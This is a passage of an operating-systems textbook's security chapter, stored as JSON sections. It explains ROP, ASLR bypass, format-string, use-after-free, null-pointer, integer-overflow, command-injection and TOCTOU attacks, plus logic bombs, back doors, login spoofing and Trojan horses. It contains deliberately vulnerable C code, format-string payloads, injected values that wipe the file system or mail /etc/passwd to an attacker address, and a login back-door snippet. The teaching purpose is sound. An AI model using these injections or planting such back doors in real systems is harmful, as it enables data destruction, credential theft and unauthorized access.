perhaps\r\ngood enough to pop any nonnegative number into register 1. The next gadget pops\r\nany stack value into register 2, and the third multiplies register 1 by 4, pushes it on\r\nthe stack, and adds it to register 2. Combining, these three gadgets yields the at\u0002tacker something that may be used to calculate the address of an element in an\r\narray of integers. The index into the array is provided by the first data value on the\r\nstack, while the base address of the array should be in the second data value.\r\nReturn-oriented programming may look very complicated, and perhaps it is.\r\nBut as always, people have dev eloped tools to automate as much as possible. Ex\u0002amples include gadget harvesters and even ROP compilers. Nowadays, ROP is one\r\nof the most important exploitation techniques used in the wild.\r\nAddress-Space Layout Randomization\r\nHere is another idea to stop these attacks. Besides modifying the return address\r\nand injecting some (ROP) program, the attacker should be able to return to exactly\r\nthe right address—with ROP no nop sleds are possible. This is easy, if the ad\u0002dresses are fixed, but what if they are not? ASLR (Address Space Layout Ran\u0002domization) aims to randomize the addresses of functions and data between every\r\nrun of the program. As a result, it becomes much harder for the attacker to exploit\r\nthe system. Specifically, ASLR often randomizes the positions of the initial stack,\r\nthe heap, and the libraries.\r\nLike canaries and DEP, many modern operating systems support ASLR, but\r\noften at different granularities. Most of them provide it for user applications, but\r\nonly a few apply it consistently also to the operating system kernel itself (Giuffrida\r\net al., 2012). The combined force of these three protection mechanisms has raised\r\nthe bar for attackers significantly. Just jumping to injected code or even some exist\u0002ing function in memory has become hard work. Together, they form an important\r\nline of defense in modern operating systems. What is especially nice about them is\r\nthat they offer their protection at a very reasonable cost to performance.\r\nBypassing ASLR\r\nEven with all three defenses enabled, attackers still manage to exploit the sys\u0002tem. There are several weaknesses in ASLR that allow intruders to bypass it. The\r\nfirst weakness is that ASLR is often not random enough. Many implementations of\r\nASLR still have certain code at fixed locations. Moreover, even if a segment is ran\u0002domized, the randomization may be weak, so that an attacker can brute-force it.\r\nFor instance, on 32-bit systems the entropy may be limited because you cannot\r\nrandomize all bits of the stack. To keep the stack working as a regular stack that\r\ngrows downward, randomizing the least significant bits is not an option.\n648 SECURITY CHAP. 9\r\nA more important attack against ASLR is formed by memory disclosures. In\r\nthis case, the attacker uses one vulnerability not to take control of the program di\u0002rectly, but rather to leak information abour the memory layout, which he can then\r\nuse to exploit a second vulnerability. As a trivial example, consider the following\r\ncode:\r\n01. void C( ) {\r\n02. int index;\r\n03. int pr ime [16] = { 1,2,3,5,7,11,13,17,19,23,29,31,37,41,43,47 };\r\n04. printf (\"Which prime number between would you like to see?\");\r\n05. index = read user input ( );\r\n06. printf (\"Prime number %d is: %d\\n\", index, prime[index]);\r\n07. }\r\nThe code contains a call to read user input, which is not part of the standard C li\u0002brary. We simply assume that it exists and returns an integer that the user types on\r\nthe command line. We also assume that it does not contain any errors. Even so, for\r\nthis code it is very easy to leak information. All we need to do is provide an index\r\nthat is greater than 15, or less than 0. As the program does not check the index, it\r\nwill happily return the value of any integer in memory.\r\nThe address of one function is often sufficient for a successful attack. The rea\u0002son is that even though the position at which a library is loaded may be ran\u0002domized, the relative offset for each individual function from this position is gener\u0002ally fixed. Phrased differently: if you know one function, you know them all. Even\r\nif this is not the case, with just one code address, it is often easy to find many oth\u0002ers, as shown by Snow et al. (2013).\r\nNoncontrol-Flow Diverting Attacks\r\nSo far, we hav e considered attacks on the control flow of a program: modifying\r\nfunction pointers and return addresses. The goal was always to make the program\r\nexecute new functionality, even if that functionality was recycled from code al\u0002ready present in the binary. Howev er, this is not the only possibility. The data itself\r\ncan be an interesting target for the attacker also, as in the following snippet of\r\npseudocode:\r\n01. void A( ) {\r\n02. int author ized;\r\n03. char name [128];\r\n04. authorized = check credentials (...); /* the attacker is not authorized, so returns 0 */\r\n05. printf (\"What is your name?\\n\");\r\n06. gets (name);\r\n07. if (author ized != 0) {\r\n08. printf (\"Welcome %s, here is all our secret data\\n\", name)\r\n09. /* ... show secret data ... */\nSEC. 9.7 EXPLOITING SOFTWARE 649\r\n10. } else\r\n11. printf (\"Sorry %s, but you are not authorized.\\n\");\r\n12. }\r\n13. }\r\nThe code is meant to do an authorization check. Only users with the right cre\u0002dentials are allowed to see the top secret data. The function check credentials is\r\nnot a function from the C library, but we assume that it exists somewhere in the\r\nprogram and does not contain any errors. Now suppose the attacker types in 129\r\ncharacters. As in the previous case, the buffer will overflow, but it will not modify\r\nthe return address. Instead, the attacker has modified the value of the authorized\r\nvariable, giving it a value that is not 0. The program does not crash and does not\r\nexecute any attacker code, but it leaks the secret information to an unauthorized\r\nuser.\r\nBuffer Overflows—The Not So Final Word\r\nBuffer overflows are some of the oldest and most important memory corrup\u0002tion techniques that are used by attackers. Despite more than a quarter century of\r\nincidents, and a a plethora of defenses (we have only treated the most important\r\nones), it seems impossible to get rid of them (Van der Veen, 2012). For all this\r\ntime, a substantial fraction of all security problems are due to this flaw, which is\r\ndifficult to fix because there are so many existing C programs around that do not\r\ncheck for buffer overflow.\r\nThe arms race is nowhere near complete. All around the world, researchers are\r\ninvestigating new defenses. Some of these defenses are aimed at binaries, others\r\nconsists of security extension to C and C++ compilers. It is important to emphasize\r\nthat attackers are also improving their exploitation techniques. In this section, we\r\nhave tried to given an overview of some of the more important techniques, but\r\nthere are many variations of the same idea. The one thing we are fairly certain of is\r\nthat in the next edition of this book, this section will still be relevant (and probably\r\nlonger)."
          },
          "9.7.2 Format String Attacks": {
            "page": 680,
            "content": "9.7.2 Format String Attacks\r\nThe next attack is also a memory-corruption attack, but of a very different\r\nnature. Some programmers do not like typing, even though they are excellent typ\u0002ists. Why name a variable reference count when rc obviously means the same\r\nthing and saves 13 keystrokes on every occurrence? This dislike of typing can\r\nsometimes lead to catastrophic system failures as described below.\r\nConsider the following fragment from a C program that prints the traditional C\r\ngreeting at the start of a program:\n650 SECURITY CHAP. 9\r\nchar *s=\"Hello Wor ld\";\r\npr intf(\"%s\", s);\r\nIn this program, the character string variable s is declared and initialized to a string\r\nconsisting of ‘‘Hello World’’ and a zero-byte to indicate the end of the string. The\r\ncall to the function printf has two arguments, the format string ‘‘%s’’, which\r\ninstructs it to print a string, and the address of the string. When executed, this piece\r\nof code prints the string on the screen (or wherever standard output goes). It is cor\u0002rect and bulletproof.\r\nBut suppose the programmer gets lazy and instead of the above types:\r\nchar *s=\"Hello Wor ld\";\r\npr intf(s);\r\nThis call to printf is allowed because printf has a variable number of arguments, of\r\nwhich the first must be a format string. But a string not containing any formatting\r\ninformation (such as ‘‘%s’’) is legal, so although the second version is not good\r\nprogramming practice, it is allowed and it will work. Best of all, it saves typing\r\nfive characters, clearly a big win.\r\nSix months later some other programmer is instructed to modify the code to\r\nfirst ask the user for his name, then greet the user by name. After studying the\r\ncode somewhat hastily, he changes it a little bit, like this:\r\nchar s[100], g[100] = \"Hello \"; /* declare s and g; initialize g */\r\ngets(s); /* read a string from the keyboard into s */\r\nstrcat(g, s); /* concatenate s onto the end of g */\r\npr intf(g); /* pr int g */\r\nNow it reads a string into the variable s and concatenates it to the initialized string\r\ng to build the output message in g. It still works. So far so good (except for the\r\nuse of gets, which is subject to buffer overflow attacks, but it is still popular).\r\nHowever, a knowledgeable user who saw this code would quickly realize that\r\nthe input accepted from the keyboard is not a just a string; it is a format string, and\r\nas such all the format specifications allowed by printf will work. While most of the\r\nformatting indicators such as ‘‘%s’’ (for printing strings) and ‘‘%d’’ (for printing\r\ndecimal integers), format output, a couple are special. In particular, ‘‘%n’’ does\r\nnot print anything. Instead it calculates how many characters should have been\r\noutput already at the place it appears in the string and stores it into the next argu\u0002ment to printf to be processed. Here is an example program using ‘‘%n’’:\r\nint main(int argc, char *argv[])\r\n{\r\nint i=0;\r\npr intf(\"Hello %nwor ld\\n\", &i); /* the %n stores into i */\r\npr intf(\"i=%d\\n\", i); /* i is now 6 */\r\n}\nSEC. 9.7 EXPLOITING SOFTWARE 651\r\nWhen this program is compiled and run, the output it produces on the screen is:\r\nHello wor ld\r\ni=6\r\nNote that the variable i has been modified by a call to printf, something not ob\u0002vious to everyone. While this feature is useful once in a blue moon, it means that\r\nprinting a format string can cause a word—or many words—to be stored into\r\nmemory. Was it a good idea to include this feature in print? Definitely not, but it\r\nseemed so handy at the time. A lot of software vulnerabilities started like this.\r\nAs we saw in the preceding example, by accident the programmer who modi\u0002fied the code allowed the user of the program to (inadvertently) enter a format\r\nstring. Since printing a format string can overwrite memory, we now hav e the tools\r\nneeded to overwrite the return address of the printf function on the stack and jump\r\nsomewhere else, for example, into the newly entered format string. This approach\r\nis called a format string attack.\r\nPerforming a format string attack is not exactly trivial. Where will the number\r\nof characters that the function printed be stored? Well, at the address of the param\u0002eter following the format string itself, just as in the example shown above. But in\r\nthe vulnerable code, the attacker could supply only one string (and no second pa\u0002rameter to printf). In fact, what will happen is that the printf function will assume\r\nthat there is a second parameter. It will just take the next value on the stack and use\r\nthat. The attacker may also make printf use the next value on the stack, for instance\r\nby providing the following format string as input:\r\n\"%08x %n\"\r\nThe ‘‘%08x’’ means that printf will print the next parameter as an 8-digit hexadeci\u0002mal number. So if that value is 1, it will print 0000001. In other words, with this\r\nformat string, printf will simply assume that the next value on the stack is a 32-bit\r\nnumber that it should print, and the value after that is the address of the location\r\nwhere it should store the number of characters printed, in this case 9: 8 for the hex\u0002adecimal number and one for the space. Suppose he supplies the format string\r\n\"%08x %08x %n\"\r\nIn that case, printf will store the value at the address provided by the third value\r\nfollowing the format string on the stack, and so on. This is the key to making the\r\nabove format string bug a ‘‘write anything anywhere’’ primitive for an attacker.\r\nThe details are beyond this book, but the idea is that the attacker makes sure that\r\nthe right target address is on the stack. This is easier than you may think. For ex\u0002ample, in the vulnerable code we presented above, the string g is itself also on the\r\nstack, at a higher address than the stack frame of printf (see Fig. 9-24). Let us as\u0002sume that the string starts as shown in Fig. 9-24, with ‘‘AAAA’’, followed by a se\u0002quence of ‘‘%0x’’ and ending with ‘‘%0n’’. What will happen? Well if the at\u0002tackers gets the number of ‘‘%0x’’s just right, he will have reached the format\n652 SECURITY CHAP. 9 ¨AAAA %08x %08x [...] %08x %n¨\r\nBuffer B\r\nfirst parameter to printf\r\n(pointer to format string) stack frame \r\nof printf\r\nFigure 9-24. A format string attack. By using exactly the right number of %08x,\r\nthe attacker can use the first four characters of the format string as an address.\r\nstring (stored in buffer B) itself. In other words, printf will then use the first 4 bytes\r\nof the format string as the address to write to. Since, the ASCII value of the charac\u0002ter A is 65 (or 0x41 in hexadecimal), it will write the result at location 0x41414141,\r\nbut the attacker can specify other addresses also. Of course, he must make sure that\r\nthe number of characters printed is exactly right (because this is what will be writ\u0002ten in the target address). In practice, there is a little more to it than that, but not\r\nmuch. If you type: ‘‘format string attack’’ to any Internet search engine, you will\r\nfind a great deal of information on the problem.\r\nOnce the user has the ability to overwrite memory and force a jump to newly\r\ninjected code, the code has all the power and access that the attacked program has.\r\nIf the program is SETUID root, the attacker can create a shell with root privileges.\r\nAs an aside, the use of fixed-size character arrays in this example could also be\r\nsubject to a buffer-overflow attack."
          },
          "9.7.3 Dangling Pointers": {
            "page": 683,
            "content": "9.7.3 Dangling Pointers\r\nA third memory-corruption technique that is very popular in the wild is known\r\nas a dangling pointer attack. The simplest manifestation of the technique is quite\r\neasy to understand, but generating an exploit can be tricky. C and C++ allow a pro\u0002gram to allocate memory on the heap using the malloc call, which returns a pointer\nSEC. 9.7 EXPLOITING SOFTWARE 653\r\nto a newly allocated chunk of memory. Later, when the program no longer needs it,\r\nit calls free to release the memory. A dangling pointer error occurs when the pro\u0002gram accidentally uses the memory after it has already freed it. Consider the fol\u0002lowing code that discriminates against (really) old people:\r\n01. int *A = (int *) malloc (128); /* allocate space for 128 integers */\r\n02. int year of bir th = read user input ( ); /* read an integer from standard input */\r\n03. if (input < 1900) {\r\n04. printf (\"Error, year of birth should be greater than 1900 \\n\");\r\n05. free (A);\r\n06. } else {\r\n07. ...\r\n08. /* do something interesting with array A */\r\n09. ...\r\n10. }\r\n11. ... /* many more statements, containing malloc and free */\r\n12. A[0] = year of bir th;\r\nThe code is wrong. Not just because of the age discrimination, but also because in\r\nline 12 it may assign a value to an element of array A after it was freed already (in\r\nline 5). The pointer A will still point to the same address, but it is not supposed to\r\nbe used anymore. In fact, the memory may already have been reused for another\r\nbuffer by now (see line 11).\r\nThe question is: what will happen? The store in line 12 will try to update mem\u0002ory that is no longer in use for array A, and may well modify a different data struc\u0002ture that now liv es in this memory area. In general, this memory corruption is not a\r\ngood thing, but it gets even worse if the attacker is able to manipulate the program\r\nin such a way that it places a specific heap object in that memory where the first in\u0002teger of that object contains, say, the user’s authorization level. This is not always\r\neasy to do, but there exist techniques (known as heap feng shui) to help attackers\r\npull it off. Feng Shui is the ancient Chinese art of orienting building, tombs, and\r\nmemory on the heap in an auspicious manner. If the digital feng shui master suc\u0002ceeds, he can now set the authorization level to any value (well, up to 1900)."
          },
          "9.7.4 Null Pointer Dereference Attacks": {
            "page": 684,
            "content": "9.7.4 Null Pointer Dereference Attacks\r\nA few hundred pages ago, in Chapter 3, we discussed memory management in\r\ndetail. You may remember how modern operating systems virtualize the address\r\nspaces of the kernel and user processes. Before a program accesses a memory ad\u0002dress, the MMU translates that virtual address to a physical address by means of\r\nthe page tables. Pages that are not mapped cannot be accessed. It seems logical to\r\nassume that the kernel address space and the address space of a user process are\r\ncompletely different, but this is not always the case. In Linux, for example, the ker\u0002nel is simply mapped into every process’ address space and whenever the kernel\n654 SECURITY CHAP. 9\r\nstarts executing to handle a system call, it will run in the process’ address space.\r\nOn a 32-bit system, user space occupies the bottom 3 GB of the address space and\r\nthe kernel the top 1 GB. The reason for this cohabitation is efficiency—switching\r\nbetween address spaces is expensive.\r\nNormally this arrangement does not cause any problems. The situation changes\r\nwhen the attacker can make the kernel call functions in user space. Why would the\r\nkernel do this? It is clear that it should not. However, remember we are talking\r\nabout bugs. A buggy kernel may in rare and unfortunate circumstances accidental\u0002ly dereference a NULL pointer. For instance, it may call a function using a func\u0002tion pointer that was not yet initialized. In recent years, several such bugs have\r\nbeen discovered in the Linux kernel. A null pointer dereference is nasty business as\r\nit typically leads to a crash. It is bad enough in a user process, as it will crash the\r\nprogram, but it is even worse in the kernel, because it takes down the entire system.\r\nSomtimes it is worse still, when the attacker is able to trigger the null pointer\r\ndereference from the user process. In that case, he can crash the system whenever\r\nhe wants. However, crashing a system does not get you any high fiv es from your\r\ncracker friends—they want to see a shell.\r\nThe crash happens because there is no code mapped at page 0. So the attacker\r\ncan use special function, mmap, to remedy this. With mmap, a user process can\r\nask the kernel to map memory at a specific address. After mapping a page at ad\u0002dress 0, the attacker can write shellcode in this page. Finally, he triggers the null\r\npointer dereference, causing the shellcode to be executed with kernel privileges.\r\nHigh fiv es all around.\r\nOn modern kernels, it is no longer possible to mmap a page at address 0. Even\r\nso, many older kernels are still used in the wild. Moreover, the trick also works\r\nwith pointers that have different values. With some bugs, the attacker may be able\r\nto inject his own pointer into the kernel and have it dereferenced. The lessons we\r\nlearn from this exploit is that kernel–user interactions may crop up in unexpected\r\nplaces and that optimizations to improve performance may come to haunt you in\r\nthe form of attacks later."
          },
          "9.7.5 Integer Overflow Attacks": {
            "page": 685,
            "content": "9.7.5 Integer Overflow Attacks\r\nComputers do integer arithmetic on fixed-length numbers, usually 8, 16, 32, or\r\n64 bits long. If the sum of two numbers to be added or multiplied exceeds the\r\nmaximum integer that can be represented, an overflow occurs. C programs do not\r\ncatch this error; they just store and use the incorrect value. In particular, if the\r\nvariables are signed integers, then the result of adding or multiplying two positive\r\nintegers may be stored as a negative integer. If the variables are unsigned, the re\u0002sults will be positive, but may wrap around. For example, consider two unsigned\r\n16-bit integers each containing the value 40,000. If they are multiplied together\r\nand the result stored in another unsigned 16-bit integer, the apparent product is\r\n4096. Clearly this is incorrect but it is not detected.\nSEC. 9.7 EXPLOITING SOFTWARE 655\r\nThis ability to cause undetected numerical overflows can be turned into an at\u0002tack. One way to do this is to feed a program two valid (but large) parameters in\r\nthe knowledge that they will be added or multiplied and result in an overflow. For\r\nexample, some graphics programs have command-line parameters giving the\r\nheight and width of an image file, for example, the size to which an input image is\r\nto be converted. If the target width and height are chosen to force an overflow, the\r\nprogram will incorrectly calculate how much memory it needs to store the image\r\nand call malloc to allocate a much-too-small buffer for it. The situation is now ripe\r\nfor a buffer overflow attack. Similar exploits are possible when the sum or product\r\nof signed positive integers results in a negative integer."
          },
          "9.7.6 Command Injection Attacks": {
            "page": 686,
            "content": "9.7.6 Command Injection Attacks\r\nYet another exploit involves getting the target program to execute commands\r\nwithout realizing it is doing so. Consider a program that at some point needs to\r\nduplicate some user-supplied file under a different name (perhaps as a backup). If\r\nthe programmer is too lazy to write the code, he could use the system function,\r\nwhich forks off a shell and executes its argument as a shell command. For ex\u0002ample, the C code\r\nsystem(\"ls >file-list\")\r\nforks off a shell that executes the command\r\nls >file-list\r\nlisting all the files in the current directory and writing them to a file called file-list.\r\nThe code that the lazy programmer might use to duplicate the file is given in\r\nFig. 9-25.\r\nint main(int argc, char *argv[])\r\n{\r\nchar src[100], dst[100], cmd[205] = \"cp \"; /* declare 3 strings */\r\npr intf(\"Please enter name of source file: \"); /* ask for source file */\r\ngets(src); /* get input from the keyboard */\r\nstrcat(cmd, src); /* concatenate src after cp */\r\nstrcat(cmd, \" \"); /* add a space to the end of cmd */\r\npr intf(\"Please enter name of destination file: \"); /* ask for output file name */\r\ngets(dst); /* get input from the keyboard */\r\nstrcat(cmd, dst); /* complete the commands string */\r\nsystem(cmd); /* execute the cp command */\r\n}\r\nFigure 9-25. Code that might lead to a command injection attack.\r\nWhat the program does is ask for the names of the source and destination files,\r\nbuild a command line using cp, and then call system to execute it. Suppose that the\n656 SECURITY CHAP. 9\r\nuser types in ‘‘abc’’ and ‘‘xyz’’ respectively, then the command that the shell will\r\nexecute is\r\ncp abc xyz\r\nwhich indeed copies the file.\r\nUnfortunately this code opens up a gigantic security hole using a technique\r\ncalled command injection. Suppose that the user types ‘‘abc’’ and ‘‘xyz; rm –rf /’’\r\ninstead. The command that is constructed and executed is now\r\ncp abc xyz; rm –rf /\r\nwhich first copies the file, then attempts to recursively remove every file and every\r\ndirectory in the entire file system. If the program is running as superuser, it may\r\nwell succeed. The problem, of course, is that everything following the semicolon\r\nis executed as a shell command.\r\nAnother example of the second argument might be ‘‘xyz; mail snooper@bad\u0002guys.com </etc/passwd’’, which produces\r\ncp abc xyz; mail snooper@bad-guys.com </etc/passwd\r\nthereby sending the password file to an unknown and untrusted address."
          },
          "9.7.7 Time of Check to Time of Use Attacks": {
            "page": 687,
            "content": "9.7.7 Time of Check to Time of Use Attacks\r\nThe last attack in this section is of a very different nature. It has nothing to do\r\nwith memory corruption or command injection. Instead, it exploits race condi\u0002tions. As always, it can best be illustrated with an example. Consider the code\r\nbelow:\r\nint fd;\r\nif (access (\"./my document\", W OK) != 0) {\r\nexit (1);\r\nfd = open (\"./my document\", O WRONLY)\r\nwr ite (fd, user input, sizeof (user input));\r\nWe assume again that the program is SETUID root and the attacker wants to\r\nuse its privileges to write to the password file. Of course, he does not have write\r\npermission to the password file, but let us have a look at the code. The first thing\r\nwe note is that the SETUID program is not supposed to write to the password file\r\nat all—it only wants to write to a file called ‘‘my document’’ in the current work\u0002ing directory. Howev er, even though a user may have this file in his current work\u0002ing directory, it does not mean that he really has write permission to this file. For\r\ninstance, the file could be a symbolic link to another file that does not belong to the\r\nuser at all, for example, the password file.\nSEC. 9.7 EXPLOITING SOFTWARE 657\r\nTo prevent this, the program performs a check to make sure the user has write\r\naccess to the file by means of the access system call. The call checks the actual\r\nfile (i.e., if it is a symbolic link, it will be dereferenced), returning 0 if the re\u0002quested access is allowed and an error value of -1 otherwise. Moreover, the check\r\nis carried out with the calling process’ real UID, rather than the effective UID (be\u0002cause otherwise a SETUID process would always have access). Only if the check\r\nsucceeds will the program proceed to open the file and write the user input to it.\r\nThe program looks secure, but is not. The problem is that the time of the ac\u0002cess check for privileges and the time at which the privileges are used are not the\r\nsame. Assume that a fraction of a second after the check by access, the attacker\r\nmanages to create a symbolic link with the same file name to the password file. In\r\nthat case, the open will open the wrong file, and the write of the attacker’s data will\r\nend up in the password file. To pull it off, the attacker has to race with the program\r\nto create the symbolic link at exactly the right time.\r\nThe attack is known as a TOCTOU (Time of Check to Time of Use) attack.\r\nAnother way of looking at this particular attack is to observe that the access system\r\ncall is simply not safe. It would be much better to open the file first, and then check\r\nthe permissions using the file descriptor instead—using the fstat function. File de\u0002scriptors are safe, because they cannot be changed by the attacker between the fstat\r\nand write calls. It shows that designing a good API for operating system is ex\u0002tremely important and fairly hard. In this case, the designers got it wrong.\r\n9.8 INSIDER ATTA CKS\r\nA whole different category of attacks are what might be termed ‘‘inside jobs.’’\r\nThese are executed by programmers and other employees of the company running\r\nthe computer to be protected or making critical software. These attacks differ from\r\nexternal attacks because the insiders have specialized knowledge and access that\r\noutsiders do not have. Below we will give a few examples; all of them have oc\u0002curred repeatedly in the past. Each one has a different flavor in terms of who is\r\ndoing the attacking, who is being attacked, and what the attacker is trying to\r\nachieve.\r\n9.8.1 Logic Bombs\r\nIn these times of massive outsourcing, programmers often worry about their\r\njobs. Sometimes they even take steps to make their potential (involuntary) depar\u0002ture less painful. For those who are inclined toward blackmail, one strategy is to\r\nwrite a logic bomb. This device is a piece of code written by one of a company’s\r\n(currently employed) programmers and secretly inserted into the production sys\u0002tem. As long as the programmer feeds it its daily password, it is happy and does\r\nnothing. However, if the programmer is suddenly fired and physically removed"
          }
        }
      },
      "9.8 INSIDER ATTACKS": {
        "page": 688,
        "children": {
          "9.8.1 Logic Bombs": {
            "page": 688,
            "content": "9.8.1 Logic Bombs\r\nIn these times of massive outsourcing, programmers often worry about their\r\njobs. Sometimes they even take steps to make their potential (involuntary) depar\u0002ture less painful. For those who are inclined toward blackmail, one strategy is to\r\nwrite a logic bomb. This device is a piece of code written by one of a company’s\r\n(currently employed) programmers and secretly inserted into the production sys\u0002tem. As long as the programmer feeds it its daily password, it is happy and does\r\nnothing. However, if the programmer is suddenly fired and physically removed\n658 SECURITY CHAP. 9\r\nfrom the premises without warning, the next day (or next week) the logic bomb\r\ndoes not get fed its daily password, so it goes off. Many variants on this theme are\r\nalso possible. In one famous case, the logic bomb checked the payroll. If the per\u0002sonnel number of the programmer did not appear in it for two consecutive payroll\r\nperiods, it went off (Spafford et al., 1989).\r\nGoing off might involve clearing the disk, erasing files at random, carefully\r\nmaking hard-to-detect changes to key programs, or encrypting essential files. In\r\nthe latter case, the company has a tough choice about whether to call the police\r\n(which may or may not result in a conviction many months later but certainly does\r\nnot restore the missing files) or to give in to the blackmail and rehire the ex-pro\u0002grammer as a ‘‘consultant’’ for an astronomical sum to fix the problem (and hope\r\nthat he does not plant new logic bombs while doing so).\r\nThere have been recorded cases in which a virus planted a logic bomb on the\r\ncomputers it infected. Generally, these were programmed to go off all at once at\r\nsome date and time in the future. However, since the programmer has no idea in\r\nadvance of which computers will be hit, logic bombs cannot be used for job pro\u0002tection or blackmail. Often they are set to go off on a date that has some political\r\nsignificance. Sometimes these are called time bombs."
          },
          "9.8.2 Back Doors": {
            "page": 689,
            "content": "9.8.2 Back Doors\r\nAnother security hole caused by an insider is the back door. This problem is\r\ncreated by code inserted into the system by a system programmer to bypass some\r\nnormal check. For example, a programmer could add code to the login program to\r\nallow anyone to log in using the login name ‘‘zzzzz’’ no matter what was in the\r\npassword file. The normal code in the login program might look something like\r\nFig. 9-26(a). The back door would be the change to Fig. 9-26(b).\r\nwhile (TRUE) { while (TRUE) {\r\npr intf(\"login: \"); printf(\"login: \");\r\nget str ing(name); get str ing(name);\r\ndisable echoing( ); disable echoing( );\r\npr intf(\"password: \"); pr intf(\"password: \");\r\nget str ing(password); get str ing(password);\r\nenable echoing( ); enable echoing( );\r\nv = check validity(name, password); v = check validity(name, password);\r\nif (v) break; if (v || strcmp(name, \"zzzzz\") == 0) break;\r\n} }\r\nexecute shell(name); execute shell(name);\r\n(a) (b)\r\nFigure 9-26. (a) Normal code. (b) Code with a back door inserted.\r\nWhat the call to strcmp does is check if the login name is ‘‘zzzzz’’. If so, the\r\nlogin succeeds, no matter what password is typed. If this back-door code were\nSEC. 9.8 INSIDER ATTACKS 659\r\ninserted by a programmer working for a computer manufacturer and then shipped\r\nwith its computers, the programmer could log into any computer made by his com\u0002pany, no matter who owned it or what was in the password file. The same holds for\r\na programmer working for the OS vendor. The back door simply bypasses the\r\nwhole authentication process.\r\nOne way for companies to prevent backdoors is to have code reviews as stan\u0002dard practice. With this technique, once a programmer has finished writing and\r\ntesting a module, the module is checked into a code database. Periodically, all the\r\nprogrammers in a team get together and each one gets up in front of the group to\r\nexplain what his code does, line by line. Not only does this greatly increase the\r\nchance that someone will catch a back door, but it raises the stakes for the pro\u0002grammer, since being caught red-handed is probably not a plus for his career. If\r\nthe programmers protest too much when this is proposed, having two cow orkers\r\ncheck each other’s code is also a possibility."
          },
          "9.8.3 Login Spoofing": {
            "page": 690,
            "content": "9.8.3 Login Spoofing\r\nIn this insider attack, the perpetrator is a legitimate user who is attempting to\r\ncollect other people’s passwords through a technique called login spoofing. It is\r\ntypically employed in organizations with many public computers on a LAN used\r\nby multiple users. Many universities, for example, have rooms full of computers\r\nwhere students can log onto any computer. It works like this. Normally, when no\r\none is logged in on a UNIX computer, a screen similar to that of Fig. 9-27(a) is dis\u0002played. When a user sits down and types a login name, the system asks for a pass\u0002word. If it is correct, the user is logged in and a shell (and possibly a GUI) is start\u0002ed.\r\nLogin: Login:\r\n(a) (b)\r\nFigure 9-27. (a) Correct login screen. (b) Phony login screen.\r\nNow consider this scenario. A malicious user, Mal, writes a program to dis\u0002play the screen of Fig. 9-27(b). It looks amazingly like the screen of Fig. 9-27(a),\r\nexcept that this is not the system login program running, but a phony one written\r\nby Mal. Mal now starts up his phony login program and walks away to watch the\r\nfun from a safe distance. When a user sits down and types a login name, the pro\u0002gram responds by asking for a password and disabling echoing. After the login\r\nname and password have been collected, they are written away to a file and the\r\nphony login program sends a signal to kill its shell. This action logs Mal out and\n660 SECURITY CHAP. 9\r\ntriggers the real login program to start and display the prompt of Fig. 9-27(a). The\r\nuser assumes that she made a typing error and just logs in again. This time, how\u0002ev er, it works. But in the meantime, Mal has acquired another (login name, pass\u0002word) pair. By logging in at many computers and starting the login spoofer on all\r\nof them, he can collect many passwords.\r\nThe only real way to prevent this is to have the login sequence start with a key\r\ncombination that user programs cannot catch. Windows uses CTRL-ALT-DEL for\r\nthis purpose. If a user sits down at a computer and starts out by first typing CTRL\u0002ALT-DEL, the current user is logged out and the system login program is started.\r\nThere is no way to bypass this mechanism."
          }
        }
      },
      "9.9 MALWARE": {
        "page": 691,
        "children": {
          "9.9.1 Trojan Horses": {
            "page": 694,
            "content": "9.9.1 Trojan Horses\r\nWriting malware is one thing. You can do it in your bedroom. Getting millions\r\nof people to install it on their computers is quite something else. How would our\r\nmalware writer, Mal, go about this? A very common practice is to write some gen\u0002uinely useful program and embed the malware inside of it. Games, music players,\r\n‘‘special’’ porno viewers, and anything with splashy graphics are likely candidates.\r\nPeople will then voluntarily download and install the application. As a free bonus,\r\nthey get the malware installed, too. This approach is called a Tr ojan horse attack,\r\nafter the wooden horse full of Greek soldiers described in Homer’s Odyssey. In the\r\ncomputer security world, it has come to mean any malware hidden in software or a\r\nWeb page that people voluntarily download.\r\nWhen the free program is started, it calls a function that writes the malware to\r\ndisk as an executable program and starts it. The malware can then do whatever\r\ndamage it was designed for, such as deleting, modifying, or encrypting files. It can\r\nalso search for credit card numbers, passwords, and other useful data and send\r\nthem back to Mal over the Internet. More likely, it attaches itself to some IP port\r\nand waits there for directions, making the machine a zombie, ready to send spam\r\nor do whatever its remote master wishes. Usually, the malware will also invoke the\r\ncommands necessary to make sure the malware is restarted whenever the machine\r\nis rebooted. All operating systems have a way to do this.\r\nThe beauty of the Trojan horse attack is that it does not require the author of\r\nthe Trojan horse to break into the victim’s computer. The victim does all the work.\r\nThere are also other ways to trick the victim into executing the Trojan horse\r\nprogram. For example, many UNIX users have an environment variable, $PATH,\r\nwhich controls which directories are searched for a command. It can be viewed by\r\ntyping the following command to the shell:\r\necho $PATH\r\nA potential setting for the user ast on a particular system might consist of the fol\u0002lowing directories:\r\n:/usr/ast/bin:/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/ucb:/usr/man\\\r\n:/usr/java/bin:/usr/java/lib:/usr/local/man:/usr/openwin/man\r\nOther users are likely to have a different search path. When the user types\r\nprog\r\nto the shell, the shell first checks to see if there is a program at the location\r\n/usr/ast/bin/prog. If there is, it is executed. If it is not there, the shell tries\r\n/usr/local/bin/prog, /usr/bin/prog, /bin/prog, and so on, trying all 10 directories in\r\nturn before giving up. Suppose that just one of these directories was left unprotect\u0002ed and a cracker put a program there. If this is the first occurrence of the program\r\nin the list, it will be executed and the Trojan horse will run.\n664 SECURITY CHAP. 9\r\nMost common programs are in /bin or /usr/bin, so putting a Trojan horse in\r\n/usr/bin/X11/ls does not work for a common program because the real one will be\r\nfound first. However, suppose the cracker inserts la into /usr/bin/X11. If a user\r\nmistypes la instead of ls (the directory listing program), now the Trojan horse will\r\nrun, do its dirty work, and then issue the correct message that la does not exist. By\r\ninserting Trojan horses into complicated directories that hardly anyone ever looks\r\nat and giving them names that could represent common typing errors, there is a fair\r\nchance that someone will invoke one of them sooner or later. And that someone\r\nmight be the superuser (even superusers make typing errors), in which case the\r\nTrojan horse now has the opportunity to replace /bin/ls with a version containing a\r\nTrojan horse, so it will be invoked all the time now.\r\nOur malicious but legal user, Mal, could also lay a trap for the superuser as fol\u0002lows. He puts a version of ls containing a Trojan horse in his own directory and\r\nthen does something suspicious that is sure to attract the superuser’s attention, such\r\nas starting up 100 compute-bound processes at once. Chances are the superuser\r\nwill check that out by typing\r\ncd /home/mal\r\nls –l\r\nto see what Mal has in his home directory. Since some shells first try the local di\u0002rectory before working through $PATH, the superuser may have just invoked 